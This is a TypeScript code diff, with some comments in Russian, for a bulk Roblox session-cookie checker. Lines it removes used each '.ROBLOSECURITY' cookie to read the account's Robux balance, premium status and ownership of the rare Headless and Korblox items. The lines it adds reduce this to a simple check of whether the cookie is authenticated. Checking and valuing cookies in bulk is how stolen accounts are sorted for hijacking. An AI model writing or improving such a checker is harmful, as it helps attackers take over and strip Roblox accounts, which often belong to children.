@@ -5,10 +5,8 @@ import { RobloxAccount } from "@shared/types";
 
 // Constants for Roblox API
 const ROBLOX_API_BASE = "https://www.roblox.com";
-const ROBLOX_ROBUX_ENDPOINT = "/mobileapi/userinfo";
-const ROBLOX_USER_ENDPOINT = "/users/v1/users/authenticated";
-const ROBLOX_PREMIUM_ENDPOINT = "/premiumfeatures/v1/users/{userId}/validate-membership";
-const ROBLOX_INVENTORY_ENDPOINT = "/inventory/v1/users/{userId}/items/Asset/{assetId}";
+// Simpler authentication check endpoint
+const ROBLOX_AUTH_ENDPOINT = "/login/navigation-menu-data";
 
 /**
  * Format a cookie for use in requests
@@ -24,10 +22,6 @@ function formatCookie(cookie: string): string {
   return `.ROBLOSECURITY=.${cookie}`;
 }
 
-// Special item IDs
-const HEADLESS_ASSET_ID = "134082579";
-const KORBLOX_ASSET_ID = "139607718";
-
 /**
  * Validate a batch of cookies asynchronously
  * @param cookies Array of cookies to validate
@@ -40,20 +34,37 @@ export async function validateCookies(cookies: string[]): Promise<void> {
   for (const cookie of cookies) {
     queueService.enqueue(async () => {
       try {
-        // Validate the cookie
-        const accountInfo = await validateCookie(cookie);
+        // Validate the cookie - simple check if it's valid
+        const isValid = await checkCookieValid(cookie);
+        
+        // Create account info object
+        const accountInfo: RobloxAccount = {
+          cookie,
+          isValid,
+          username: isValid ? "Valid Account" : "",
+          userId: "",
+          robuxBalance: 0,
+          pendingRobux: 0,
+          premium: false,
+          donations: 0,
+          rap: 0,
+          hasHeadless: false,
+          hasKorblox: false,
+          avatarUrl: "",
+          processedAt: new Date().toISOString(),
+        };
         
         // Store the result
         await storage.storeCookie(accountInfo);
         
         // Update queue status
-        queueService.processingComplete(accountInfo.isValid);
+        queueService.processingComplete(isValid);
         
         // Add to log
         queueService.addLogEntry(
-          accountInfo.isValid
-            ? `✓ ${accountInfo.username} (ID: ${accountInfo.userId}) - Valid`
-            : `✗ Invalid cookie - Failed to authenticate`
+          isValid
+            ? `✓ Cookie is valid`
+            : `✗ Cookie is invalid`
         );
       } catch (error: any) {
         console.error("Error validating cookie:", error);
@@ -91,106 +102,13 @@ export async function validateCookies(cookies: string[]): Promise<void> {
 }
 
 /**
- * Validate a single cookie against Roblox API
+ * Simple check if a cookie is valid
  * @param cookie Roblox cookie to validate
- * @returns Promise with account information
+ * @returns Promise<boolean> indicating if cookie is valid
  */
-async function validateCookie(cookie: string): Promise<RobloxAccount> {
+async function checkCookieValid(cookie: string): Promise<boolean> {
   try {
-    // Get user information
-    const userInfo = await fetchUserInfo(cookie);
-    
-    if (!userInfo || !userInfo.UserID) {
-      throw new Error("Failed to authenticate");
-    }
-    
-    // Get Robux balance
-    const robuxInfo = await fetchRobuxInfo(cookie);
-    
-    // Check premium status
-    const isPremium = await checkPremiumStatus(cookie, userInfo.UserID);
-    
-    // Check for special items
-    const hasHeadless = await checkForItem(cookie, userInfo.UserID, HEADLESS_ASSET_ID);
-    const hasKorblox = await checkForItem(cookie, userInfo.UserID, KORBLOX_ASSET_ID);
-    
-    // Return the account information
-    return {
-      cookie,
-      isValid: true,
-      username: userInfo.DisplayName || "",
-      userId: userInfo.UserID.toString(),
-      robuxBalance: robuxInfo.RobuxBalance || 0,
-      pendingRobux: robuxInfo.RobuxPending || 0,
-      premium: isPremium,
-      donations: 0, // This information may not be available via API
-      rap: 0, // This would require additional API calls to calculate
-      hasHeadless,
-      hasKorblox,
-      avatarUrl: `https://www.roblox.com/headshot-thumbnail/image?userId=${userInfo.UserID}&width=150&height=150`,
-      processedAt: new Date().toISOString(),
-    };
-  } catch (error: any) {
-    throw new Error(`Validation failed: ${error.message || 'Unknown error'}`);
-  }
-}
-
-/**
- * Fetch user information from Roblox API
- * @param cookie Roblox cookie
- * @returns User information
- */
-async function fetchUserInfo(cookie: string): Promise<any> {
-  try {
-    const response = await fetch(`${ROBLOX_API_BASE}${ROBLOX_USER_ENDPOINT}`, {
-      headers: {
-        Cookie: formatCookie(cookie),
-      },
-    });
-    
-    if (!response.ok) {
-      throw new Error(`User info request failed: ${response.status}`);
-    }
-    
-    return await response.json();
-  } catch (error: any) {
-    throw new Error(`Failed to fetch user info: ${error.message || 'Unknown error'}`);
-  }
-}
-
-/**
- * Fetch Robux balance from Roblox API
- * @param cookie Roblox cookie
- * @returns Robux information
- */
-async function fetchRobuxInfo(cookie: string): Promise<any> {
-  try {
-    const response = await fetch(`${ROBLOX_API_BASE}${ROBLOX_ROBUX_ENDPOINT}`, {
-      headers: {
-        Cookie: formatCookie(cookie),
-      },
-    });
-    
-    if (!response.ok) {
-      throw new Error(`Robux info request failed: ${response.status}`);
-    }
-    
-    return await response.json();
-  } catch (error: any) {
-    throw new Error(`Failed to fetch Robux info: ${error.message || 'Unknown error'}`);
-  }
-}
-
-/**
- * Check if user has premium membership
- * @param cookie Roblox cookie
- * @param userId User ID
- * @returns Whether user has premium
- */
-async function checkPremiumStatus(cookie: string, userId: number): Promise<boolean> {
-  try {
-    const endpoint = ROBLOX_PREMIUM_ENDPOINT.replace("{userId}", userId.toString());
-    const response = await fetch(`${ROBLOX_API_BASE}${endpoint}`, {
+    const response = await fetch(`${ROBLOX_API_BASE}${ROBLOX_AUTH_ENDPOINT}`, {
       headers: {
         Cookie: formatCookie(cookie),
       },
@@ -200,41 +118,18 @@ async function checkPremiumStatus(cookie: string, userId: number): Promise<boole
       return false;
     }
     
-    const data: any = await response.json();
-    return data.isPremium || false;
-  } catch (error: any) {
-    console.error(`Failed to check premium status: ${error.message || 'Unknown error'}`);
-    return false;
-  }
-}
-
-/**
- * Check if user has a specific item in inventory
- * @param cookie Roblox cookie
- * @param userId User ID
- * @param assetId Asset ID to check for
- * @returns Whether user has the item
- */
-async function checkForItem(cookie: string, userId: number, assetId: string): Promise<boolean> {
-  try {
-    const endpoint = ROBLOX_INVENTORY_ENDPOINT
-      .replace("{userId}", userId.toString())
-      .replace("{assetId}", assetId);
-    
-    const response = await fetch(`${ROBLOX_API_BASE}${endpoint}`, {
-      headers: {
-        Cookie: formatCookie(cookie),
-      },
-    });
-    
-    if (!response.ok) {
-      return false;
+    // Явно типизируем данные как объект с интерфейсом
+    interface AuthResponse {
+      isAuthenticated?: boolean;
+      [key: string]: any;
     }
     
-    const data: any = await response.json();
-    return data.data && data.data.length > 0;
+    const data = await response.json() as AuthResponse;
+    
+    // Проверяем наличие флага isAuthenticated
+    return Boolean(data?.isAuthenticated);
   } catch (error: any) {
-    console.error(`Failed to check for item ${assetId}: ${error.message || 'Unknown error'}`);
+    console.error(`Cookie validation failed: ${error.message || 'Unknown error'}`);
     return false;
   }
 }
